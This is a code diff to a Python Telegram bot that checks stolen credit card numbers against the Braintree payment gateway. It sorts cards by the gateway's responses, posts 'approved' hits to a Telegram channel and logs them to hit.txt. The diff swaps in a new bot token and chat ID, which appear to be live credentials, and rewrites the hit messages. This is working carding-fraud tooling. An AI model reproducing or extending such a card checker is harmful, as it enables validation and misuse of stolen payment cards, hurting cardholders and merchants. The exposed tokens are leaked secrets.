@@ -8,8 +8,8 @@ from colorama import Fore
 from hh import keep_alive
 
 sto = {"stop": False}
-token = "6476983960:AAHipEEkl8HsP5IwRr7aa2ajN0WOtiRxHfE"
-id = 5743774416
+token = "6400098011:AAGOH2O4ipvTn9TVowOZzHLFHqAl1eTaSwk"
+id = 5696557432
 channel_username = "@v_8_d"
 bot = telebot.TeleBot(token, parse_mode="HTML")
 
@@ -123,76 +123,33 @@ def main(message):
 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅
 
 𝗖𝗖 ⇾ {cc}
-𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Braintree 0.01
-𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Approved
-
-𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {ii}
-𝗕𝗮𝗻𝗸: {bank}
-𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {do}
-
-𝗕𝗬:@YYNXX
-𝗖𝗛:@ALRAGI1
-±++++++++++++++++++++++++++++
-لطلب تنصيب بوت فحص تواصل مع المطور. @YYNXX
+𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Braintree 5$
+𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Approved ✅
 '''
                         print(Fore.YELLOW + cc + "->" + Fore.GREEN + last)
                         bot.reply_to(message, respo)
                         bot.send_message(channel_username, respo)
                         with open("hit.txt", "a") as f:
                             f.write(f'''
-±++++++++++++++++++++++++++++
-𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅
-
 𝗖𝗖 ⇾ {cc}
-𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Braintree 0.01
-𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Approved
-
-𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {ii}
-𝗕𝗮𝗻𝗸: {bank}
-𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {do}
-
-𝗕𝗬:@YYNXX
-𝗖𝗛:@ALRAGI1
-±++++++++++++++++++++++++++++
-لطلب تنصيب بوت فحص تواصل مع المطور. @YYNXX
-±++++++++++++++++++++++++++++
+𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Braintree Auth
+𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Approved ✅
 ''')
                     elif "Status code avs: Gateway Rejected: avs" in last or "Nice! New payment method added:" in last or "Status code 81724: Duplicate card exists in the vault." in last:
                         ok += 1
                         respo = (f'''
-𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅
-
 𝗖𝗖 ⇾ {cc}
-𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Braintree 0.01
-𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Approved
-
-𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {ii}
-𝗕𝗮𝗻𝗸: {bank}
-𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {do}
-𝗕𝗬:@YYNXX
-𝗖𝗛:@ALRAGI1
-±++++++++++++++++++++++++++++
-لطلب تنصيب بوت فحص تواصل مع المطور. @YYNXX
+𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Braintree 1$
+𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Approved ✅
 ''')
                         print(Fore.YELLOW + cc + "->" + Fore.GREEN + last)
                         bot.reply_to(message, respo)
                         bot.send_message(channel_username, respo)
                         with open("hit.txt", "a") as f:
                             f.write(f'''
-±++++++++++++++++++++++++++++
-𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅
-
 𝗖𝗖 ⇾ {cc}
-𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Braintree 0.01
-𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Approved
-
-𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {ii}
-𝗕𝗮𝗻𝗸: {bank}
-𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {do}
-
-𝗕𝗬:@YYNXX
-𝗖𝗛:@ALRAGI1
-±++++++++++++++++++++++++++++
+𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Braintree 10$
+𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Approved ✅
 ''')
                     else:
                         bad += 1
